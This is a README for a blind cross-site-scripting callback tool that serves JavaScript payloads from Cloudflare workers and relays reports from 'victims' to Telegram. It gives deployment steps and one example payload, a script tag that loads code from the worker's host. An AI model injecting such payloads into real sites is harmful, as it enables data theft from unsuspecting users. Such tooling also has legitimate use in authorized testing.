# XSS Flare
XSS hunter ported on cloudflare serverless workers ! This script serves JS payloads from cloudflare workers and redirects the incoming callbacks to telegram. (Telegram bot token is not exposed to victims) It generates blind XSS reports that looks like this.

![REPORT](https://github.com/EgeBalci/xss-flare/raw/master/screenshot.png)

## Installation
1. Login to your cloudflare account and create a serverless worker.
2. Replace the `BotToken` and `ChatID` values inside the `index.js` file.
3. Paste the `index.js` contents into the cloudflare worker script editor.
4. Click `Save and Deploy`. All done !

Here is an example blind XSS payload.
```
<script src="https://[your.workername].workers.dev"></script>
```